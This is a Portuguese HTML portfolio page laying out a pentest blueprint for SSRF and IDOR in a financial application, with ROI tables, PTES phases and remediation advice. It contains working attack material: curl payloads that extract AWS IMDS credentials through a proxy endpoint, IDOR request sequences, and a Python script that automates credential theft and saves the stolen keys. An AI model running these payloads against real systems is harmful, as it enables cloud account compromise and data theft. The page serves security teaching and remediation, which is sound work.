<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="description" content="Pentest Blueprint SSRF & Broken Access Control - ROI 25.9x, Score 9.8/10">
    <meta name="keywords" content="pentest, ssrf, broken access control, owasp top 10, security, ethical hacking, roi">
    <meta name="author" content="DemÃ³stenes Silva">
    
    <title>Hacker Ã‰tico - Pentest SSRF & BAC | ROI 25.9x</title>
    
    <link rel="stylesheet" href="../styles.css">
</head>
<body>
    <div>
        <!-- Back Button -->
        <a href="../index.html" class="back-button">â† Voltar para Especialistas</a>
        
        <!-- Hero Section -->
        <div class="hero">
            <div class="specialist-icon-large">ğŸ›¡ï¸</div>
            <h1>Hacker Ã‰tico - Pentest Blueprint: SSRF & Broken Access Control</h1>
            <p class="subtitle">Blueprint enterprise-grade de penetration testing para aplicaÃ§Ã£o financeira, com foco em vulnerabilidades crÃ­ticas A01 e A10 da OWASP Top 10 2021</p>
            
            <div class="badges">
                <span class="badge badge-score">Score: 9.8/10 â­â­â­â­â­</span>
                <span class="badge badge-roi">ROI: 25.9x</span>
                <span class="badge badge-enterprise">Payback: 44 dias</span>
            </div>
            
            <div class="roi-highlight">
                <strong>Investimento:</strong> $35K â†’ <strong>Risco Mitigado:</strong> $915K/ano
            </div>
        </div>
        
        <!-- Business Context -->
        <div class="section">
            <h2>ğŸ“Š Contexto de NegÃ³cio</h2>
            
            <div class="grid-2">
                <div class="card">
                    <h3>ğŸ¯ Problema Identificado</h3>
                    <p><strong>AplicaÃ§Ã£o:</strong> FinanceControl (gestÃ£o financeira interna)</p>
                    <p><strong>Status Quo:</strong> Nunca passou por pentest manual aprofundado</p>
                    <p><strong>Risco CrÃ­tico:</strong></p>
                    <ul>
                        <li>Fraude interna por falhas de controle de acesso</li>
                        <li>Vazamento de dados estratÃ©gicos via SSRF</li>
                        <li>Falha em auditorias SOX/ISO 27001</li>
                        <li>Pivoting para rede interna via metadados cloud</li>
                    </ul>
                </div>

                <div class="card">
                    <h3>ğŸ’° ROI Detalhado</h3>
                    <table class="table">
                        <tr>
                            <th>Risco</th>
                            <th>Prob.</th>
                            <th>Impacto</th>
                            <th>Mitigado</th>
                        </tr>
                        <tr>
                            <td>Fraude Interna (BAC)</td>
                            <td>15%</td>
                            <td>$1.5M</td>
                            <td>$225K</td>
                        </tr>
                        <tr>
                            <td>Vazamento Dados (SSRF)</td>
                            <td>10%</td>
                            <td>$4.9M</td>
                            <td>$490K</td>
                        </tr>
                        <tr>
                            <td>Falha Auditoria SOX</td>
                            <td>40%</td>
                            <td>$250K</td>
                            <td>$100K</td>
                        </tr>
                        <tr>
                            <td>Pivoting Ransomware</td>
                            <td>5%</td>
                            <td>$2M</td>
                            <td>$100K</td>
                        </tr>
                        <tr class="highlight">
                            <td><strong>TOTAL</strong></td>
                            <td colspan="2"><strong>Investimento: $35.25K</strong></td>
                            <td><strong>$915K</strong></td>
                        </tr>
                    </table>
                    <div class="roi-badge">ROI: 25.9x</div>
                </div>
            </div>
        </div>
        
        <!-- Attack Flow -->
        <div class="section">
            <h2>ğŸ¯ Fluxo de Ataque SSRF</h2>
            
            <div class="card">
                <h3>ğŸ“ Diagrama do Ataque (AWS IMDS)</h3>
                <pre class="code-block">
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚                    ATACANTE (Pentester)                 â”‚
â”‚  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”   â”‚
â”‚  â”‚  Payload SSRF:                                   â”‚   â”‚
â”‚  â”‚  url=http://169.254.169.254/latest/meta-data/    â”‚   â”‚
â”‚  â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜   â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
             â”‚
             â”‚ 1. HTTP Request (manipulado)
             â–¼
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚         APLICAÃ‡ÃƒO VULNERÃVEL (FinanceControl)           â”‚
â”‚  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”   â”‚
â”‚  â”‚  GET /api/v1/proxy?url=http://169.254.169.254/   â”‚   â”‚
â”‚  â”‚  âŒ Sem validaÃ§Ã£o de URL                          â”‚   â”‚
â”‚  â”‚  âŒ Sem allow-list                                â”‚   â”‚
â”‚  â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜   â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
             â”‚
             â”‚ 2. Server-Side Request (interna)
             â–¼
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚        AWS IMDS (Instance Metadata Service)             â”‚
â”‚             IP: 169.254.169.254                         â”‚
â”‚  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”   â”‚
â”‚  â”‚  {                                               â”‚   â”‚
â”‚  â”‚    "AccessKeyId": "ASIA...",                     â”‚   â”‚
â”‚  â”‚    "SecretAccessKey": "wJa...",                  â”‚   â”‚
â”‚  â”‚    "Token": "IQoJb3JpZ2luX2VjE..."              â”‚   â”‚
â”‚  â”‚  }                                               â”‚   â”‚
â”‚  â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜   â”‚
â”‚                    ğŸ”¥ CREDENCIAIS VAZADAS!              â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
             â”‚
             â”‚ 3. Response (JSON com credenciais)
             â–¼
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚                    ATACANTE (Pentester)                 â”‚
â”‚  âœ… Credenciais AWS obtidas!                            â”‚
â”‚  âœ… Acesso total Ã  infraestrutura cloud                 â”‚
â”‚  âœ… Proof of Concept completo                           â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜

IMPACTO:
â”œâ”€ ğŸ”¥ Comprometimento total da conta AWS
â”œâ”€ ğŸ’° Acesso a S3 buckets com dados de clientes
â”œâ”€ ğŸ—„ï¸ Acesso a bancos de dados RDS
â”œâ”€ ğŸš¨ Potencial para ransomware na nuvem
â””â”€ ğŸ“Š ViolaÃ§Ã£o de compliance (SOX, ISO 27001)
                </pre>
            </div>
        </div>
    </div>

    <!-- Technical Architecture -->
    <div class="section">
            <h2 >ğŸ—ï¸ Metodologia de Pentest (PTES)</h2>
            
            <div class="card">
                <h3>ğŸ“‹ 7 Fases do Penetration Testing Execution Standard</h3>
                <pre class="code-block">
1. [PRE-ENGAGEMENT]
   â”œâ”€ Rules of Engagement (ROE) com foco em dados financeiros
   â”œâ”€ Provisionamento de 3 contas de teste (Analyst, Manager, Admin)
   â””â”€ DefiniÃ§Ã£o de canais de comunicaÃ§Ã£o de emergÃªncia

2. [INTELLIGENCE GATHERING]
   â”œâ”€ Mapeamento da aplicaÃ§Ã£o com as 3 contas de usuÃ¡rio
   â””â”€ IdentificaÃ§Ã£o de todos os parÃ¢metros controlados pelo usuÃ¡rio

3. [THREAT MODELING]
   â”œâ”€ Foco em atores internos (funcionÃ¡rio curioso, mal-intencionado)
   â””â”€ Vetores: manipulaÃ§Ã£o de parÃ¢metros, abuso de funcionalidades

4. [VULNERABILITY ANALYSIS] - FOCO PRINCIPAL
   â”œâ”€ [A01] Testes de IDOR em todos os endpoints
   â”œâ”€ [A01] Escalonamento vertical (Analyst â†’ Admin)
   â”œâ”€ [A01] Escalonamento horizontal (Analyst A â†’ Analyst B)
   â”œâ”€ [A10] AnÃ¡lise de funcionalidades que consomem URLs
   â””â”€ [A10] Tentativas de acesso a serviÃ§os internos (IMDS)

5. [EXPLOITATION]
   â”œâ”€ [A01] PoC: Acessar relatÃ³rio financeiro de outro usuÃ¡rio
   â””â”€ [A10] PoC: Extrair credenciais AWS via SSRF

6. [POST-EXPLOITATION]
   â”œâ”€ Demonstrar impacto de negÃ³cio
   â””â”€ Mapear cadeia de ataque completa

7. [REPORTING]
   â”œâ”€ RelatÃ³rio com PoCs replicÃ¡veis
   â””â”€ RecomendaÃ§Ãµes tÃ¡ticas e estratÃ©gicas
                </pre>
            </div>

            <div class="grid-2" style="margin-top: 2rem;">
                <div class="card">
                    <h3>ğŸ¯ OWASP Top 10 2021</h3>
                    <table class="table">
                        <tr>
                            <th>ID</th>
                            <th>Vulnerabilidade</th>
                            <th>CVSS</th>
                        </tr>
                        <tr>
                            <td><span class="badge badge-critical">A01</span></td>
                            <td>Broken Access Control (IDOR)</td>
                            <td>8.8</td>
                        </tr>
                        <tr>
                            <td><span class="badge badge-critical">A10</span></td>
                            <td>Server-Side Request Forgery</td>
                            <td>9.1</td>
                        </tr>
                        <tr>
                            <td><span class="badge badge-high">A05</span></td>
                            <td>Security Misconfiguration</td>
                            <td>7.5</td>
                        </tr>
                        <tr>
                            <td><span class="badge badge-medium">A07</span></td>
                            <td>Authentication Failures</td>
                            <td>6.5</td>
                        </tr>
                    </table>
                </div>

                <div class="card">
                    <h3>âš”ï¸ MITRE ATT&CK Tactics</h3>
                    <ul class="tech-list">
                        <li><strong>TA0001:</strong> Initial Access</li>
                        <li><strong>T1190:</strong> Exploit Public-Facing Application</li>
                        <li><strong>T1087.001:</strong> Local Account Discovery</li>
                        <li><strong>T1110.001:</strong> Password Guessing</li>
                        <li><strong>T1210:</strong> Exploitation of Remote Services</li>
                        <li><strong>T1005:</strong> Data from Local System</li>
                        <li><strong>T1041:</strong> Exfiltration Over C2 Channel</li>
                    </ul>
                </div>
            </div>
        </div>
    </div>

    <!-- Payloads Section -->
    <div class="section">
            <h2 >ğŸ’» Payloads ExecutÃ¡veis</h2>

            <div class="card">
                <h3>ğŸ”´ ExploraÃ§Ã£o de SSRF (AWS IMDS)</h3>
                <p><strong>Objetivo:</strong> Extrair credenciais temporÃ¡rias da instÃ¢ncia AWS para obter acesso Ã  infraestrutura cloud.</p>
                
                <h4>Passo 1: ConfirmaÃ§Ã£o da Vulnerabilidade (Out-of-Band Callback)</h4>
                <pre class="code-block"><code># Setup do listener
ngrok http 8080

# Envio do payload de callback
curl "https://app.empresa.com/api/v1/proxy?url=http://random-subdomain.ngrok.io"

# ValidaÃ§Ã£o: Se receber conexÃ£o no netcat, SSRF estÃ¡ confirmado
nc -lvp 8080</code></pre>

                <h4>Passo 2: Acesso ao ServiÃ§o de Metadados (IMDSv1)</h4>
                <pre class="code-block"><code># 1. Listar categorias de metadados
curl "https://app.empresa.com/api/v1/proxy?url=http://169.254.169.254/latest/meta-data/"
# Resultado: ami-id, hostname, instance-id, iam/, etc.

# 2. Extrair o nome do IAM Role
curl "https://app.empresa.com/api/v1/proxy?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/"
# Resultado: EC2-Production-Role

# 3. Extrair as credenciais temporÃ¡rias (PROOF OF CONCEPT)
curl "https://app.empresa.com/api/v1/proxy?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/EC2-Production-Role"</code></pre>

                <h4>Resultado Esperado (JSON com credenciais):</h4>
                <pre class="code-block"><code>{
  "Code" : "Success",
  "LastUpdated" : "2024-05-21T10:30:00Z",
  "Type" : "AWS-HMAC",
  "AccessKeyId" : "ASIAXXXXXXXXXXXXXXXX",
  "SecretAccessKey" : "xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx",
  "Token" : "IQoJb3JpZ2luX2VjE... (long token) ...",
  "Expiration" : "2024-05-21T16:45:00Z"
}</code></pre>

                <h4>Passo 3: Bypass do IMDSv2 (Se IMDSv1 falhar)</h4>
                <pre class="code-block"><code># 1. Obter token de sessÃ£o (requisiÃ§Ã£o PUT)
TOKEN=$(curl -X PUT "http://169.254.169.254/latest/api/token" \
  -H "X-aws-ec2-metadata-token-ttl-seconds: 21600")

# 2. Usar o token para acessar os metadados
curl -H "X-aws-ec2-metadata-token: $TOKEN" \
  "http://169.254.169.254/latest/meta-data/iam/security-credentials/EC2-Production-Role"</code></pre>
            </div>

            <div class="card" style="margin-top: 2rem;">
                <h3>ğŸ”µ ExploraÃ§Ã£o de Broken Access Control (IDOR)</h3>
                <p><strong>Objetivo:</strong> Validar se um usuÃ¡rio pode acessar/modificar dados de outro usuÃ¡rio.</p>

                <h4>Proof of Concept (PoC):</h4>
                <pre class="code-block"><code># 1. Login como Analyst A (user_id: 101) e obter token
# 2. Acessar um relatÃ³rio legÃ­timo (reportId: 550, owner: 101)
curl -X GET 'https://finance.internal.corp/api/v1/reports/550' \
  -H 'Authorization: Bearer <TOKEN_ANALYST_A>'
# Resposta: 200 OK com dados do relatÃ³rio 550

# 3. Tentar acessar um relatÃ³rio de outro usuÃ¡rio (reportId: 551, owner: 202 - Manager)
curl -X GET 'https://finance.internal.corp/api/v1/reports/551' \
  -H 'Authorization: Bearer <TOKEN_ANALYST_A>'
# Resposta ESPERADA: 403 Forbidden
# Resposta ATUAL: 200 OK (VULNERABILIDADE CONFIRMADA!)</code></pre>

                <h4>CÃ³digo de RemediaÃ§Ã£o (Python/Flask):</h4>
                <pre class="code-block"><code>@app.route('/api/v1/reports/&lt;int:report_id&gt;')
@login_required
def get_report(report_id):
    report = Report.query.get(report_id)
    
    # âœ… CORREÃ‡ÃƒO: Verificar propriedade do recurso
    if report.owner_id != current_user.id:
        return {"error": "Access denied"}, 403
    
    return report.to_json()</code></pre>
            </div>

            <div class="card" style="margin-top: 2rem;">
                <h3>ğŸ¤– Script de AutomaÃ§Ã£o (Python)</h3>
                <p><strong>Objetivo:</strong> Automatizar a exploraÃ§Ã£o de SSRF e extraÃ§Ã£o de credenciais AWS.</p>

                <pre class="code-block"><code>#!/usr/bin/env python3
"""
SSRF Exploitation Tool - AWS IMDS
Author: Pentest Team
Usage: python3 ssrf_exploit.py --target https://app.empresa.com/api/v1/proxy
"""

import requests
import json
import sys
from urllib.parse import urlencode

class SSRFExploiter:
    def __init__(self, target_url, param_name="url"):
        self.target_url = target_url
        self.param_name = param_name
        self.imds_base = "http://169.254.169.254/latest/meta-data"
    
    def test_ssrf(self):
        """Testa se a vulnerabilidade SSRF existe"""
        print("[*] Testando vulnerabilidade SSRF...")
        
        payload = f"{self.target_url}?{self.param_name}={self.imds_base}/"
        try:
            response = requests.get(payload, timeout=10)
            if "ami-id" in response.text or "instance-id" in response.text:
                print("[+] âœ… SSRF CONFIRMADO! AplicaÃ§Ã£o Ã© vulnerÃ¡vel.")
                return True
            else:
                print("[-] âŒ SSRF nÃ£o detectado.")
                return False
        except Exception as e:
            print(f"[-] Erro: {e}")
            return False
    
    def get_iam_role(self):
        """Extrai o nome do IAM Role"""
        print("[*] Extraindo nome do IAM Role...")
        
        payload = f"{self.target_url}?{self.param_name}={self.imds_base}/iam/security-credentials/"
        response = requests.get(payload, timeout=10)
        
        role_name = response.text.strip()
        print(f"[+] IAM Role encontrado: {role_name}")
        return role_name
    
    def get_credentials(self, role_name):
        """Extrai as credenciais temporÃ¡rias"""
        print("[*] Extraindo credenciais AWS...")
        
        payload = f"{self.target_url}?{self.param_name}={self.imds_base}/iam/security-credentials/{role_name}"
        response = requests.get(payload, timeout=10)
        
        try:
            creds = json.loads(response.text)
            print("\n[+] ğŸ”¥ CREDENCIAIS OBTIDAS:")
            print(f"    AccessKeyId: {creds['AccessKeyId']}")
            print(f"    SecretAccessKey: {creds['SecretAccessKey'][:20]}...")
            print(f"    Token: {creds['Token'][:50]}...")
            print(f"    Expiration: {creds['Expiration']}")
            
            # Salvar credenciais em arquivo
            with open('aws_credentials.json', 'w') as f:
                json.dump(creds, f, indent=2)
            print("\n[+] Credenciais salvas em: aws_credentials.json")
            
            return creds
        except json.JSONDecodeError:
            print("[-] Erro ao parsear JSON de credenciais")
            return None
    
    def run(self):
        """Executa o exploit completo"""
        if self.test_ssrf():
            role_name = self.get_iam_role()
            if role_name:
                creds = self.get_credentials(role_name)
                if creds:
                    print("\n[+] âœ… Exploit bem-sucedido!")
                    print("[!] âš ï¸ NÃƒO USE ESTAS CREDENCIAIS PARA AÃ‡Ã•ES MALICIOSAS!")
                    print("[!] Este Ã© um teste de seguranÃ§a autorizado.")
                    return True
        return False

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("Usage: python3 ssrf_exploit.py --target https://app.empresa.com/api/v1/proxy")
        sys.exit(1)
    
    target = sys.argv[2] if "--target" in sys.argv else sys.argv[1]
    
    exploiter = SSRFExploiter(target)
    exploiter.run()</code></pre>

                <h4 style="margin-top: 1.5rem;">Como Usar:</h4>
                <pre class="code-block"><code># 1. Dar permissÃ£o de execuÃ§Ã£o
chmod +x ssrf_exploit.py

# 2. Executar o script
python3 ssrf_exploit.py --target https://finance-portal.internal.corp/api/v1/proxy

# 3. Resultado esperado:
# [*] Testando vulnerabilidade SSRF...
# [+] âœ… SSRF CONFIRMADO!
# [*] Extraindo nome do IAM Role...
# [+] IAM Role encontrado: EC2-Production-Role
# [*] Extraindo credenciais AWS...
# [+] ğŸ”¥ CREDENCIAIS OBTIDAS!
# [+] Credenciais salvas em: aws_credentials.json</code></pre>
            </div>
        </div>
    </div>

    <!-- Tools & Stack -->
    <div class="section">
            <h2 >ğŸ› ï¸ Ferramentas & Stack TecnolÃ³gico</h2>
            
            <div class="grid-3">
                <div class="card">
                    <h3>Web Application Testing</h3>
                    <ul class="tech-list">
                        <li><strong>Burp Suite Professional 2024.5+</strong></li>
                        <li>â†³ Autorize 2.1+ (automaÃ§Ã£o BAC)</li>
                        <li>â†³ AuthMatrix 1.1+ (testes sistemÃ¡ticos)</li>
                        <li><strong>OWASP ZAP 2.14+</strong></li>
                        <li>Alternativa open-source</li>
                    </ul>
                </div>

                <div class="card">
                    <h3>SSRF Testing</h3>
                    <ul class="tech-list">
                        <li><strong>SSRFmap 1.0+</strong></li>
                        <li>AutomaÃ§Ã£o de exploraÃ§Ã£o</li>
                        <li><strong>Interactsh (ProjectDiscovery)</strong></li>
                        <li>OAST para Blind SSRF</li>
                        <li><strong>Python Scripts (requests 2.31+)</strong></li>
                        <li>PoCs customizados</li>
                    </ul>
                </div>

                <div class="card">
                    <h3>Code Analysis (SAST)</h3>
                    <ul class="tech-list">
                        <li><strong>Semgrep 1.60+</strong></li>
                        <li>Regras r/python.lang.security.ssrf</li>
                        <li><strong>SonarQube Enterprise 10+</strong></li>
                        <li>AnÃ¡lise de controle de acesso</li>
                        <li><strong>GitHub Advanced Security</strong></li>
                        <li>CodeQL queries</li>
                    </ul>
                </div>
            </div>
        </div>
    </div>

    <!-- Remediation -->
    <div class="section">
            <h2 >ğŸ›¡ï¸ RemediaÃ§Ã£o & Controles de SeguranÃ§a</h2>
            
            <div class="card">
                <h3>ğŸ“‹ Tabela de RemediaÃ§Ã£o (4 Prioridades)</h3>
                <table class="table">
                    <tr>
                        <th>Prioridade</th>
                        <th>AÃ§Ã£o</th>
                        <th>Detalhes TÃ©cnicos</th>
                        <th>Owner</th>
                        <th>Custo/Ano</th>
                    </tr>
                    <tr>
                        <td><span class="badge badge-critical">1. Imediata</span></td>
                        <td>Bloquear IMDS via WAF</td>
                        <td>Criar regra de WAF para bloquear 169.254.169.254. Configurar Egress rules nos Security Groups.</td>
                        <td>DevOps</td>
                        <td>$2K</td>
                    </tr>
                    <tr>
                        <td><span class="badge badge-high">2. Correta</span></td>
                        <td>Allow-List de URLs</td>
                        <td>Implementar lista estrita de domÃ­nios permitidos. Validar e sanitizar toda entrada do usuÃ¡rio.</td>
                        <td>Backend Team</td>
                        <td>$0</td>
                    </tr>
                    <tr>
                        <td><span class="badge badge-high">3. EstratÃ©gica</span></td>
                        <td>ForÃ§ar IMDSv2</td>
                        <td>Configurar todas instÃ¢ncias EC2 para exigir IMDSv2 (HttpTokens=required).</td>
                        <td>Cloud Security</td>
                        <td>$0</td>
                    </tr>
                    <tr>
                        <td><span class="badge badge-medium">4. Detectiva</span></td>
                        <td>Monitorar IMDS</td>
                        <td>CloudTrail + VPC Flow Logs para alertar acessos anÃ´malos ao serviÃ§o de metadados.</td>
                        <td>SOC</td>
                        <td>$5K</td>
                    </tr>
                </table>
            </div>

            <div class="grid-2" style="margin-top: 2rem;">
                <div class="card">
                    <h3>ğŸ”’ Controles Preventivos</h3>
                    <ul class="tech-list">
                        <li><strong>Centralized Access Control:</strong> MÃ³dulo central de verificaÃ§Ã£o de permissÃµes</li>
                        <li><strong>Ownership Checks:</strong> Verificar owner_id em cada endpoint</li>
                        <li><strong>SSRF Egress Allow-list:</strong> Firewall com domÃ­nios confiÃ¡veis</li>
                        <li><strong>Disable Cloud Metadata:</strong> Bloquear 169.254.169.254</li>
                        <li><strong>SAST Rules:</strong> SonarQube/Semgrep para detectar IDOR/SSRF</li>
                    </ul>
                </div>

                <div class="card">
                    <h3>ğŸ‘ï¸ Controles Detectivos</h3>
                    <ul class="tech-list">
                        <li><strong>Security Logging:</strong> Logar todas tentativas de acesso negadas (403)</li>
                        <li><strong>Alert apÃ³s 5 falhas:</strong> Alerta em 1 minuto</li>
                        <li><strong>SIEM Integration:</strong> Splunk/ELK para correlaÃ§Ã£o de eventos</li>
                        <li><strong>Anomaly Detection:</strong> ML para detectar padrÃµes anormais</li>
                        <li><strong>Threat Intelligence:</strong> Feed de IPs maliciosos</li>
                    </ul>
                </div>
            </div>
        </div>
    </div>

    <!-- Compliance & Next Steps -->
    <div class="section">
            <h2 >ğŸ“œ Compliance & PrÃ³ximos Passos</h2>
            
            <div class="grid-2">
                <div class="card">
                    <h3>âœ… Compliance Demonstrado</h3>
                    <ul class="tech-list">
                        <li><strong>Sarbanes-Oxley (SOX):</strong> SeÃ§Ã£o 302/404 - Valida eficÃ¡cia dos controles internos sobre relatÃ³rios financeiros</li>
                        <li><strong>ISO 27001:2022:</strong> A.5.15 (Access Control), A.8.3 (Information access restriction)</li>
                        <li><strong>NIST CSF:</strong> PR.AC-4 (Access Control)</li>
                        <li><strong>PCI DSS v4.0:</strong> Requirement 6.2.4 (Secure coding)</li>
                    </ul>
                </div>

                <div class="card">
                    <h3>ğŸ“ˆ 5 PrÃ³ximos Passos</h3>
                    <ol class="tech-list">
                        <li><strong>Aprovar Budget ($35.25K)</strong> - Owner: CISO - Timeline: 3 dias</li>
                        <li><strong>Definir ROE e Agendar</strong> - Owner: Security Lead - Timeline: 5 dias</li>
                        <li><strong>Executar Pentest (80h)</strong> - Owner: Vendor - Timeline: 2 semanas</li>
                        <li><strong>Triagem de Vulnerabilidades</strong> - Owner: App Owner - Timeline: 2 dias</li>
                        <li><strong>RemediaÃ§Ã£o e Reteste</strong> - Owner: Dev Team - Timeline: 1-2 semanas</li>
                    </ol>
                </div>
            </div>
        </div>
    </div>

    <!-- Why This Matters -->
    <div class="section">
            <h2 >ğŸ¯ Por Que Isso Importa?</h2>
            
            <div class="grid-3">
                <div class="card highlight">
                    <h3>ğŸ’¼ Para Executivos (C-Level)</h3>
                    <ul>
                        <li><strong>ROI de 25.9x</strong> - $915K de risco mitigado com investimento de $35.25K</li>
                        <li><strong>Compliance garantido</strong> - AprovaÃ§Ã£o em auditorias SOX/ISO 27001</li>
                        <li><strong>ProteÃ§Ã£o da reputaÃ§Ã£o</strong> - Evitar data breach de $4.9M</li>
                        <li><strong>Zero custo operacional</strong> - ApÃ³s implementaÃ§Ã£o das correÃ§Ãµes</li>
                    </ul>
                </div>

                <div class="card highlight">
                    <h3>ğŸ‘¨â€ğŸ’¼ Para Recrutadores</h3>
                    <ul>
                        <li><strong>Metodologia profissional</strong> - PTES + MITRE ATT&CK + OWASP Top 10</li>
                        <li><strong>Expertise em cloud</strong> - AWS IMDS, GCP, Azure metadados</li>
                        <li><strong>Payloads executÃ¡veis</strong> - Curl commands prontos para reproduÃ§Ã£o</li>
                        <li><strong>VisÃ£o de negÃ³cio</strong> - ROI, stakeholders, compliance mapeados</li>
                    </ul>
                </div>

                <div class="card highlight">
                    <h3>ğŸ‘¨â€ğŸ’» Para Engenheiros</h3>
                    <ul>
                        <li><strong>PoCs replicÃ¡veis</strong> - IDOR e SSRF com payloads reais</li>
                        <li><strong>CÃ³digo de remediaÃ§Ã£o</strong> - Python/Flask exemplo de correÃ§Ã£o</li>
                        <li><strong>Ferramentas enterprise</strong> - Burp Suite Pro, SSRFmap, Interactsh</li>
                        <li><strong>SAST integration</strong> - Semgrep rules para CI/CD</li>
                    </ul>
                </div>
            </div>
        </div>
        </div>
        
        <!-- CTA Section -->
        <div class="section" style="text-align: center;">
            <h2>Pronto para proteger seus sistemas crÃ­ticos?</h2>
            <p>Este blueprint de pentest pode ser adaptado para qualquer aplicaÃ§Ã£o enterprise.</p>
            <div class="cta-buttons">
                <a href="../index.html" class="btn btn-primary">â† Voltar ao Showcase</a>
                <a href="https://github.com/demostenessilva" class="btn btn-secondary" target="_blank">Ver Mais Projetos â†’</a>
            </div>
        </div>
        
        <!-- Footer -->
        <footer class="footer" style="margin-top: 3rem; padding: 2rem 0; text-align: center; color: rgba(255,255,255,0.7);">
            <p>&copy; 2025 AI Specialists Showcase - Open Source Project</p>
            <p>Enterprise-Grade Solutions by DemÃ³stenes Silva</p>
        </footer>
    </div>
</body>
</html>

